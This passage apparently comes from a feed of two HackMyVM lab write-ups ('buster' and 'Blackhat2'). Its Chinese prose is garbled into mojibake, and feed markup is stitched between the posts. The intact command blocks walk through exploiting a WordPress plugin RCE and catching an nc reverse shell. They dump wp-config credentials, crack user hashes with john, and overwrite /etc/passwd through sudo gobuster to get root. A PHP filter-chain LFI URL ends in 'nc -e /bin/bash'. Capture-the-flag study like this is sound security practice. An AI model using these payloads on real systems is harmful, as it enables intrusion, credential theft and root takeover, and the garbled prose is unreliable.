ÁàÜÁ†¥‰∫ÜÂâç5000Ë°å`rockyou.txt`ÈÉΩÊ≤°ÊúâÁªìÊûúÔºåÊ≤°ÊúâÂøÖË¶ÅÁàÜÁ†¥‰∫ÜÔºåÊ†πÊçÆÁé∞Âú®Ëé∑ÂæóÁöÑ‰ø°ÊÅØÊó†Ê≥ïÂà§Êñ≠Âá∫ÊîªÂáªÈù¢Ôºå‰ΩÜÊòØ`WordPress`Èù∂Êú∫ËøòÊúâ‰∏Ä‰∏™ÊîªÂáªÁÇπ‚Äî‚Äî**Êèí‰ª∂**

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ wpscan --url http://192.168.205.142/ -e ap --plugins-detection aggressive --api-token xxx   #api-tokenÊ≥®ÂÜåwpscanÂÆòÁΩëËé∑Âèñ
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ¬Æ
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________
ÔºàÁúÅÁï•Ôºâ

[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:17:12 &lt;================================================&gt; (108550 / 108550) 100.00% Time: 00:17:12
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] akismet
 | Location: http://192.168.205.142/wp-content/plugins/akismet/
 | Latest Version: 5.3.5 (up to date)
 | Last Updated: 2024-11-19T02:02:00.000Z
 | Readme: http://192.168.205.142/wp-content/plugins/akismet/readme.txt
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.205.142/wp-content/plugins/akismet/, status: 200
 |
 | Version: 5.3.5 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.205.142/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.205.142/wp-content/plugins/akismet/readme.txt

[+] feed
 | Location: http://192.168.205.142/wp-content/plugins/feed/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.205.142/wp-content/plugins/feed/, status: 200
 |
 | The version could not be determined.

[+] wp-query-console
 | Location: http://192.168.205.142/wp-content/plugins/wp-query-console/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2018-03-16T16:03:00.000Z
 | Readme: http://192.168.205.142/wp-content/plugins/wp-query-console/README.txt
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.205.142/wp-content/plugins/wp-query-console/, status: 403
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: WP Query Console &lt;= 1.0 - Unauthenticated Remote Code Execution
 |     References:
 |      - https://wpscan.com/vulnerability/f911568d-5f79-49b7-8ce4-fa0da3183214
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-50498
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/ae07ca12-e827-43f9-8cbb-275b9abbd4c3
 |
 | Version: 1.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.205.142/wp-content/plugins/wp-query-console/README.txt

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 3
 | Requests Remaining: 15

[+] Finished: Wed Jan 15 20:39:16 2025
[+] Requests Done: 108575
[+] Cached Requests: 44
[+] Data Sent: 29.36 MB
[+] Data Received: 32.766 MB
[+] Memory used: 479.719 MB
[+] Elapsed time: 00:17:25

```

`wp-query-console`ÊúâÊºèÊ¥ûÔºåÊàë‰ª¨ÂéªÊêúÁ¥¢‰∏Ä‰∏ãÊúâÊ≤°ÊúâÂà©Áî®ÊñπÊ°à„ÄÇÂèØ‰ª•ÊâæÂà∞‰∏ÄÁØáËøôÊ†∑ÁöÑÊñáÁ´†[RandomRobbieBF/CVE-2024-50498](https://github.com/RandomRobbieBF/CVE-2024-50498)

![image](https://github.com/user-attachments/assets/72a55300-d8e3-4b5d-b895-5a370c1fd640)

Ê†πÊçÆÊèêÁ§∫Âà©Áî®‰∏Ä‰∏ã

![image](https://github.com/user-attachments/assets/3a1b94f1-b121-441a-a33c-d6db585b5507)

ÊàêÂäüÂà©Áî®ÔºåÂ∞ùËØïÁúãËÉΩ‰∏çËÉΩÂºπshell

![image](https://github.com/user-attachments/assets/74d4c4b9-7dc8-4f1b-9bd6-669273dfc52f)

ÊòæÁ§∫Êü•ËØ¢ÂèÇÊï∞Â§±Ë¥•ÔºåÊàë‰ª¨Â∞ùËØïping kaliÔºåÊó†ÊûúÔºåÂ∫îËØ•ÊòØban‰∫ÜÂáΩÊï∞ÔºåÊàë‰ª¨ÊêúÁ¥¢‰∏Ä‰∏ã

![image](https://github.com/user-attachments/assets/d355dc93-3a9f-436e-a874-7b36e93f57b5)

Á°ÆÂÆûË¢´ban‰∫ÜÔºåÊàë‰ª¨Â∞ùËØï‰∏Ä‰∏ã‰ΩøÁî®Êú™Ë¢´banÁöÑÂáΩÊï∞

![image](https://github.com/user-attachments/assets/82858cb3-8662-44af-b9aa-f5f02210d1ad)

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ sudo tcpdump -A -n icmp  
[sudo] kali ÁöÑÂØÜÁ†ÅÔºö
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
20:52:15.340738 IP 192.168.205.142 &gt; 192.168.205.141: ICMP echo request, id 1113, seq 1, length 64
E..T..@.@.)..............Y..e..g....j....................... !'#$%&amp;'()*+,-./01234567
20:52:15.340759 IP 192.168.205.141 &gt; 192.168.205.142: ICMP echo reply, id 1113, seq 1, length 64
E..T
O..@.S..............Y..e..g....j....................... !'#$%&amp;'()*+,-./01234567
20:52:16.353977 IP 192.168.205.142 &gt; 192.168.205.141: ICMP echo request, id 1113, seq 2, length 64
E..T.M@.@.(...........4Y.Y..f..g.....b...................... !'#$%&amp;'()*+,-./01234567
20:52:16.353997 IP 192.168.205.141 &gt; 192.168.205.142: ICMP echo reply, id 1113, seq 2, length 64
E..T
T..@.S...........&lt;Y.Y..f..g.....b...................... !'#$%&amp;'()*+,-./01234567

```

Êàë‰ª¨ÂèØ‰ª•ÁúãÂà∞Êàë‰ª¨ÁöÑpingÂëΩ‰ª§Ë¢´ÊâßË°å‰∫ÜÔºåÊàë‰ª¨ËøõË°åÂºπshell

![image](https://github.com/user-attachments/assets/8effbcee-22c7-4b8d-9c2d-e1f2d8b65842)

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nc -lvnp 8888                                  
listening on [any] 8888 ...
connect to [192.168.205.141] from (UNKNOWN) [192.168.205.142] 58804
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# 3. Ëé∑ÂæóÁ®≥ÂÆöÁöÑ Shell

Ëé∑Âèñ**ÂèçÂêë shell** ÂêéÔºåÈÄöËøá‰ª•‰∏ãÂëΩ‰ª§Ëé∑ÂæóÁ®≥ÂÆöÁöÑ**‰∫§‰∫íÂºè** **TTY shell**Ôºö

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

# 4.ÊèêÊùÉ

```bash
www-data@listen:~/html/wordpress$ cd /home/
www-data@listen:/home$ ls -la
total 12
drwxr-xr-x  3 root    root    4096 Jan  7 23:16 .
drwxr-xr-x 18 root    root    4096 Jan  7 21:50 ..
drwx------  2 welcome welcome 4096 Jan  7 23:18 welcome
```

ÂΩìÁúãÂà∞Ëøô‰∏™**id**ÁöÑÊó∂ÂÄôÊàëÂ∞±Áü•ÈÅìË¶ÅÂéªÊü•Áúã**mysql**‰∫ÜÔºåÂõ†‰∏∫Ëøô‰∏™ÂêçÂ≠óÂíåÁàÜÁ†¥Âá∫Êù•ÁöÑÂêçÂ≠ó‰∏ÄÊ†∑ÔºåÊàë‰ª¨ÂÖàÂéªÊâæ‰∏Ä‰∏ã**mysql**ÁöÑÂØÜÁ†Å

```bash
www-data@listen:/home$ cd /var/www/html/wordpress/
www-data@listen:~/html/wordpress$ ls -la
total 248
drwxr-xr-x  5 www-data www-data  4096 Jan  8 02:25 .
drwxr-xr-x  3 root     root      4096 Jan  7 23:52 ..
-rwxr-xr-x  1 www-data www-data   405 Jan  8 02:25 index.php
-rwxr-xr-x  1 www-data www-data 19915 Dec 31  2023 license.txt
-rwxr-xr-x  1 www-data www-data  7409 Jun 18  2024 readme.html
-rw-r--r--  1 root     root       684 Jan  8 02:25 update_url.php
-rwxr-xr-x  1 www-data www-data  7387 Feb 13  2024 wp-activate.php
drwxr-xr-x  9 www-data www-data  4096 Nov 21 09:07 wp-admin
-rwxr-xr-x  1 www-data www-data   351 Feb  6  2020 wp-blog-header.php
-rwxr-xr-x  1 www-data www-data  2323 Jun 14  2023 wp-comments-post.php
-rwxr-xr-x  1 www-data www-data  3336 Oct 15 11:24 wp-config-sample.php
-rw-rw-rw-  1 www-data www-data  3620 Jan  8 02:25 wp-config.php
drwxr-xr-x  6 www-data www-data  4096 Jan  8 02:20 wp-content
-rwxr-xr-x  1 www-data www-data  5617 Aug  2 15:40 wp-cron.php
drwxr-xr-x 30 www-data www-data 12288 Nov 21 09:07 wp-includes
-rwxr-xr-x  1 www-data www-data  2502 Nov 26  2022 wp-links-opml.php
-rwxr-xr-x  1 www-data www-data  3937 Mar 11  2024 wp-load.php
-rwxr-xr-x  1 www-data www-data 51367 Sep 30 15:12 wp-login.php
-rwxr-xr-x  1 www-data www-data  8543 Sep 18 18:37 wp-mail.php
-rwxr-xr-x  1 www-data www-data 29032 Sep 30 13:08 wp-settings.php
-rwxr-xr-x  1 www-data www-data 34385 Jun 19  2023 wp-signup.php
-rwxr-xr-x  1 www-data www-data  5102 Oct 18 11:56 wp-trackback.php
-rwxr-xr-x  1 www-data www-data  3246 Mar  2  2024 xmlrpc.php
www-data@listen:~/html/wordpress$ cat wp-config.php
&lt;?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the website, you can copy this file to 'wp-config.php'
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'll104567' );

/** Database password */
define( 'DB_PASSWORD', 'thehandsomeguy' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '2Ryf &lt;:T/-4,9h?q%jDi(HKG_*1xH-nU+-//7[1H}zD@=q0ls8junY(~.MG@D[$S' );
define( 'SECURE_AUTH_KEY',  '}z]MVJ|P5~X1!+76?dT?s|@A,92D4/+phWkWb=;I+k{_y)7,A,&lt;=5|&amp;z&lt;tE:`HET' );
define( 'LOGGED_IN_KEY',    'p4w9&gt;FcR&gt;{+u:M,M4rT}VIW.[Pg=UZjzp8n{-/&amp;F;j!nC49f-^~$unsry+lHW w!' );
define( 'NONCE_KEY',        ';qi?~eGux58*l4NoDh@?&lt;`^B6!HK{G:C85Hv8sC6&lt;t,y}8veV4pvs#{ [[T?s123' );
define( 'AUTH_SALT',        'l2^yBli3l_G#J&lt;T 2p}e#bS&gt;j_=,!06$%qYd#I&lt;p22c:z&amp;`s?ic;7UxS$T6c{HXr' );
define( 'SECURE_AUTH_SALT', '&lt;;95CFam*#)^qbL)a,KZXrqS$!]Ln^2yF2wg#Fa?9F&lt;D)-,irw&amp;nj/$pB)BR1u|O' );
define( 'LOGGED_IN_SALT',   'JaR6i0q&lt;wZMJD-7HwE:7ZwtNxV$BJ%15=8~Bw(_jCL_`+&lt;`^asIdv=$Yo81jE19K' );
define( 'NONCE_SALT',       'q!5K2-Q*^%Tf&lt;lz)*o0&amp;8/CCjU;8-jdLS4,*5vk/8,^j&amp;]&lt;S7+I&amp;eO55C_CM6N@L' );

/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 *
 * At the installation time, database tables are created with the specified prefix.
 * Changing this value after WordPress is installed will make your site think
 * it has not been installed.
 *
 * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/#table-prefix
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://developer.wordpress.org/advanced-administration/debug/debug-wordpress/
 */
define( 'WP_DEBUG', false );

/* Add any custom values between this line and the 'stop editing' line. */



/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
if ( file_exists(ABSPATH . 'update-url.php') ) {
    include_once(ABSPATH . 'update-url.php');
}

```

ÁôªÂΩï

```bash
www-data@listen:~/html/wordpress$ mysql -u ll104567 -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 118794
Server version: 10.3.39-MariaDB-0+deb10u2 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]&gt; show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| wordpress          |
+--------------------+
2 rows in set (0.000 sec)

MariaDB [(none)]&gt; use wordpress;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [wordpress]&gt; show tables;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
12 rows in set (0.000 sec)

MariaDB [wordpress]&gt; select * from wp_users;
+----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email        | user_url              | user_registered     | user_activation_key                           | user_status | display_name |
+----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+
|  1 | ta0        | $P$BDDc71nM67DbOVN/U50WFGII6EF6.r. | ta0           | 2814928906@qq.com | http://192.168.31.181 | 2025-01-08 03:10:43 |                                               |           0 | ta0          |
|  2 | welcome    | $P$BtP9ZghJTwDfSn1gKKc.k3mq4Vo.Ko/ | welcome       | 127.0.0.1@qq.com  |                       | 2025-01-08 04:29:28 | 1736310568:$P$B2YbhlDVF1XWIurbL11Pfoasb./0tD. |           0 | welcome      |
+----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+
2 rows in set (0.000 sec)


```

ÂèØ‰ª•Ëé∑ÂæóÂØÜÁ†ÅÂìàÂ∏åÊòØ`BtP9ZghJTwDfSn1gKKc.k3mq4Vo.Ko/`ÔºåÊàë‰ª¨ÁàÜÁ†¥‰∏Ä‰∏ã

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
```

Ëé∑ÂæóÂØÜÁ†ÅÔºåÊàë‰ª¨ÂàáÊç¢‰∏Ä‰∏ãÁî®Êà∑

```bash
www-data@listen:~/html/wordpress$ su - welcome
Password: 
$ id
uid=1001(welcome) gid=1001(welcome) groups=1001(welcome)
```

ÁªßÁª≠Â∞ùËØïÊèêÊùÉ

```bash
$ sudo -l
Matching Defaults entries for welcome on listen:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User welcome may run the following commands on listen:
    (ALL) NOPASSWD: /usr/bin/gobuster

```

ÂèØ‰ª•Áî®**sudo**ÊùÉÈôêËøêË°å**gobuster**„ÄÇÁΩë‰∏ä‰∏ÄÁÇπËµÑÊñôÈÉΩÊ≤°ÊúâÔºåÂîØ‰∏ÄÁ±ª‰ººÁöÑÊòØ‰ΩøÁî®gobusterÁöÑÊâ´ÊèèÂäüËÉΩÊé¢ÊµãÊñáÊú¨Ôºå‰ΩÜÊòØÊàë‰ª¨ËøôÈáå‰∏çÁÆ°Áî®ÔºåÂõ†‰∏∫`ta0`Âíå`ll04567`‰∏§‰ΩçÂ§ß‰Ω¨ÂëΩÂêçÁöÑflag‰∏çÊòØ`root.txt`ÔºåÈúÄË¶ÅÁî®Âà∞‰∏ÄÁÇπÂêäÁÇ∏Â§©ÁöÑÊìç‰ΩúÔºåÁî±`ll04567`Â§ß‰Ω¨ÊèêÂá∫Ôºå`ll04567„ÄÅta0„ÄÅÂüéÂçóËä±Â∑≤ÂºÄ„ÄÅ fw`Â§ß‰Ω¨‰ª¨ÂÖ±ÂêåÊé¢Á¥¢ÁöÑ`gobuster`ÊèêÊùÉÊäÄÂ∑ß

```bash
# ÊîªÂáªÊú∫
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ perl -e 'print crypt('1','aa')'
aacFCuAIHhrCM  

‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ cat a.py               
from flask import Flask, Response

app = Flask(__name__)

@app.route('/', defaults={'path': ''})
@app.route('/&lt;path:path&gt;')
def catch_all(path):
    if len(path) == 36:
        return Response(status=404)
    else:
        return Response(status=200)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)

                                      
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ python3 a.py                 
 * Serving Flask app 'a'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:80
 * Running on http://192.168.205.141:80
Press CTRL+C to quit

#Èù∂Êú∫
$ echo 'aaa:aacFCuAIHhrCM:0:0:x:/root:/bin/bash' &gt; aaa
welcome@listen:~$ sudo /usr/bin/gobuster -w aaa -u http://192.168.205.141 -n -q -o /etc/passwd
/aaa:aacFCuAIHhrCM:0:0:x:/root:/bin/bash
welcome@listen:~$ cat /etc/passwd
/aaa:aacFCuAIHhrCM:0:0:x:/root:/bin/bash
welcome@listen:~$ su - /aaa
Password: 
/aaa@listen:~# id
uid=0(/aaa) gid=0(root) groups=0(root)

```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_buster.html</guid><pubDate>Fri, 27 Jun 2025 09:32:41 +0000</pubDate></item><item><title>hmv_Blackhat2</title><link>https://7r1UMPHK.github.io/post/hmv_Blackhat2.html</link><description># hmv_Blackhat2

**Èù∂Êú∫**Ôºö[HackMyVM - Blackhat2](https://hackmyvm.eu/machines/machine.php?vm=Blackhat2)
**ÈöæÂ∫¶**ÔºöÈªÑËâ≤
**ÁõÆÊ†á IP**Ôºö192.168.205.218
**Êú¨Êú∫ IP**Ôºö192.168.205.141

## 1. Á´ØÂè£Êûö‰∏æÂèäÊúçÂä°Êé¢Êµã

È¶ñÂÖàÔºå‰ΩøÁî® `nmap` Êâ´ÊèèÁõÆÊ†á IP ÁöÑÂºÄÊîæÁ´ØÂè£Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nmap -sV -sT -O -Pn -n -p- 192.168.205.218
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-31 21:27 CST
Nmap scan report for 192.168.205.218
Host is up (0.00034s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
MAC Address: 08:00:27:17:26:A8 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

‰ªé `nmap` Êâ´ÊèèÁªìÊûúÊù•ÁúãÔºåÁõÆÊ†áÊú∫Âô®ÂºÄÊîæ‰∫Ü 22 (SSH) Âíå 80 (HTTP) Á´ØÂè£„ÄÇÊé•‰∏ãÊù•ÔºåÊàë‰ª¨ÂØπ HTTP ÊúçÂä°ËøõË°åËøõ‰∏ÄÊ≠•ÁöÑÁõÆÂΩïÁàÜÁ†¥„ÄÇ

## 2. Web ÊúçÂä°Êé¢Êµã‰∏é PHP ËøáÊª§Âô®ÈìæÂà©Áî®

ÈÄöËøá‰ΩøÁî® `gobuster` ËøõË°åÁõÆÂΩïÁàÜÁ†¥ÔºåÊâæÂà∞‰∫ÜÂá†‰∏™ÊúâÁî®ÁöÑË∑ØÂæÑÔºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ gobuster dir -u http://192.168.205.218 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,html,txt,md -b 404
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.218
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,html,txt,md
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/html                (Status: 403) [Size: 280]
/index.html           (Status: 200) [Size: 996]
/index.php            (Status: 200) [Size: 996]
/.php                 (Status: 403) [Size: 280]
/news.php             (Status: 200) [Size: 3418]
/2021                 (Status: 200) [Size: 31875]
/2022                 (Status: 200) [Size: 34213]
/2023                 (Status: 200) [Size: 36067]
/.php                 (Status: 403) [Size: 280]
/.html                (Status: 403) [Size: 280]
/server-status        (Status: 403) [Size: 280]
```

* `/index.php` Âíå `/index.html` ÁöÑÊñá‰ª∂Â§ßÂ∞èÁõ∏ÂêåÔºåÊ≤°ÊúâÂèëÁé∞ÊúâÁî®ÁöÑ‰ø°ÊÅØ„ÄÇ
* `/news.php` È°µÈù¢Ë¶ÅÊ±ÇËæìÂÖ•‰∏Ä‰∏™ÈÇÆÁÆ±Âú∞ÂùÄ„ÄÇËæìÂÖ•‰∏Ä‰∏™ÊúâÊïàÁöÑÈÇÆÁÆ±ÂêéÔºåÂèØ‰ª•ËÆøÈóÆÂà∞ `/2021`, `/2022`, `/2023` Á≠âÊñ∞ÈóªÈ°µÈù¢„ÄÇ

‰∏çËøáÔºåÂú® `/news.php` È°µÈù¢‰∏≠ÔºåURL ‰∏≠Êúâ‰∏Ä‰∏™ÂºÇÂ∏∏ÁöÑÂú∞ÊñπÔºåÊèêÁ§∫Êàë‰ª¨ÂèØ‰ª•Â∞ùËØïÂà©Áî® **LFI**ÔºàÊú¨Âú∞Êñá‰ª∂ÂåÖÂê´ÔºâÊºèÊ¥û„ÄÇ

## 3. Âà©Áî® PHP Filter ËøáÊª§Âô®Èìæ

Âú®Â∞ùËØï‰∫Ü LFI ÊîªÂáªÂêéÔºåÊàëÂèëÁé∞Ëøô‰∏™È°µÈù¢ÂÆûÈôÖ‰∏äÊòØÂèØ‰ª•Âà©Áî® **PHP ËøáÊª§Âô®Èìæ** Êù•ÊâßË°åÂëΩ‰ª§„ÄÇÁªèËøá‰∏Ä‰∫õÊÄùËÄÉÂêéÔºåÊàëÂÜ≥ÂÆö‰ΩøÁî® [PHP Filter Chain Generator](https://github.com/synacktiv/php_filter_chain_generator) Êù•ÁîüÊàê‰∏Ä‰∏™ËøáÊª§Âô®Èìæ„ÄÇËØ•Â∑•ÂÖ∑Â∏ÆÂä©Êàë‰ª¨ÊûÑÂª∫ÂèØ‰ª•ÈÄöËøá `php://filter` ÁªïËøá PHP ÁöÑÂÆâÂÖ®ÈôêÂà∂Âπ∂ÊâßË°å‰ªªÊÑèÂëΩ‰ª§ÁöÑÈìæ„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ git clone https://github.com/synacktiv/php_filter_chain_generator.git
Ê≠£ÂÖãÈöÜÂà∞ 'php_filter_chain_generator'...
...
```

ÁÑ∂ÂêéÔºåÊàë‰ΩøÁî®ÁîüÊàêÁöÑÈìæÊù°Êù•Ëé∑ÂèñÂèçÂêë shellÔºö

```bash
http://192.168.205.218/news.php?year=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&amp;0=nc -e /bin/bash 192.168.205.141 8888
```

## 4. Ëé∑ÂæóÁ®≥ÂÆöÁöÑ Shell

Ëé∑ÂèñÂèçÂêë shell ÂêéÔºåÈÄöËøá‰ª•‰∏ãÂëΩ‰ª§Ëé∑ÂæóÁ®≥ÂÆöÁöÑ‰∫§‰∫íÂºè TTY shellÔºö

```bash
script /dev/null -c bash  
ctrl+z  
stty raw -echo; fg  
reset xterm  
export TERM=xterm  
echo $SHELL  
export SHELL=/bin/bash  
stty rows 59 cols 236
```

## 5. ÊèêÊùÉ

